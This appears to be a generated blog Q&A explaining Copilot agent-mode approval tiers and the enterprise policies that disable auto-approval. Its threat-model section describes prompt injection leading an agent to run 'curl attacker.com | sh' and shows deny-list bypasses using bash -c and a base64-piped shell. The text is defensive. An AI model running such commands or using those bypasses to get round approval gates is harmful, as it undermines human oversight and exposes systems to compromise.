---
audio: false
generated: true
image: false
lang: en
layout: post
title: Enterprise Copilot Approval Hierarchy
translated: false
type: note
---

**Question:** The "Allow all commands in this session" option in VS Code GitHub Copilot agent mode is convenient — but in an enterprise environment where auto-approval is disabled by policy, what actually happens, and what options remain?

**Answer:**

Yes, it's convenient — it's effectively session-scoped YOLO mode. But understand the layering, because in an enterprise setup the convenient path gets cut off at the policy level, not the UI level.

**The approval hierarchy in VS Code Copilot agent mode**

There are roughly four tiers, from narrow to nuclear:

1. **Per-invocation approval** — the default. You click Continue/Allow for each terminal command or tool call.
2. **Scoped approvals** — "Allow for this session", "Allow for this workspace", or allow a specific command pattern. This is what you're describing. It lives in ephemeral session state or workspace settings.
3. **Allow/deny lists** — declarative rules in `settings.json`:

```jsonc
// .vscode/settings.json or user settings
"chat.tools.terminal.autoApprove": {
  "git status": true,
  "git log": true,
  "/^npm (test|run lint)$/": true,   // regex form
  "rm": false,
  "curl": false
}
```

4. **Global auto-approve** — `chat.tools.global.autoApprove`, the "YOLO mode" that approves everything including file writes and MCP tool calls.

**What "auto approval disabled" means in enterprise**

Enterprises don't disable the button per se — they enforce a device-level policy. The `ChatToolsAutoApprove` policy controls the global auto-approval setting; setting it to `false` prevents developers from enabling global auto-approval, and it's deployed via device management so it overrides user-configured settings on managed devices. In a managed VS Code, you'll see the setting greyed out with a "managed by your organization" note, and flipping it in `settings.json` does nothing — policy wins over user/workspace/folder settings in VS Code's settings precedence chain.

This is exactly the bank scenario: one banking customer's security policy dictates a human must be in the loop to approve all commands the agent wants to run, 100% of the time — which matches your environment.

There's a newer batch of related enterprise policies worth knowing since you're at a bank: `ChatMCP` (disable all MCP servers), `ChatAgentNetworkFilter` / `ChatAgentAllowedNetworkDomains` / `ChatAgentDeniedNetworkDomains` (restrict which hosts the agent's fetch tool can reach), and `ChatAgentSandboxEnabled` (run terminal commands in a sandbox). So the lockdown can go well beyond just the approve button.

**What typically still works under that policy**

The policy targets the *global* kill-switch. The granular terminal allow-list (`chat.tools.terminal.autoApprove` / older `github.copilot.chat.agent.terminal.allowList`) often remains usable unless the org pushes additional policies. So the practical enterprise pattern is:

```jsonc
// Workspace-level: auto-approve only read-only commands
"chat.tools.terminal.autoApprove": {
  "git status": true,
  "git diff": true,
  "ls": true,
  "cat": true,
  "grep": true,
  "python -m pytest": true
}
```

Read-only and test commands flow without clicks; anything mutating (`rm`, `git push`, `pip install`, `curl`) still prompts. This keeps the human-in-the-loop guarantee the security team wants while killing ~80% of the approval friction. Whether even this is allowed depends on whether your org pushed a policy for it too — check `code --status` or the Settings UI for the "managed" badge.

**The deeper reason banks insist on this**

The threat model isn't you — it's prompt injection. The agent reads files, web content, and MCP outputs; a malicious string in a README or fetched page can steer it into running `curl attacker.com | sh`. Per-command approval is the last line of defense, since deny-lists are trivially bypassed (`bash -c "rm ..."`, `echo cm0... | base64 -d | sh`). That's why "allow all in this session" is fine on your personal MacBook with your own repos, but genuinely dangerous on a bank workstation touching internal code plus internet-fetched context.

If you want session-level YOLO without fighting policy, the sanctioned-ish path is isolation: Copilot CLI sessions with Worktree isolation run on an isolated copy of your codebase, and all tool calls are auto-approved without confirmation dialogs — auto-approval becomes acceptable because the blast radius is contained. Same philosophy as running Claude Code with `--dangerously-skip-permissions` inside a devcontainer: don't remove the gate, shrink what's behind it.

**References:**

- [Manage AI settings in enterprise environments — VS Code docs](https://code.visualstudio.com/docs/enterprise/ai-settings)
- [Copilot extension governance concerns — DevOps Journal](https://devopsjournal.io/blog/2026/05/01/Copilot-extension-governance-concerns)
- [Copilot CLI sessions in VS Code](https://code.visualstudio.com/docs/copilot/agents/copilot-cli)
- [No way to disable auto-approve (IntelliJ) — banking customer issue](https://github.com/microsoft/copilot-intellij-feedback/issues/1581)
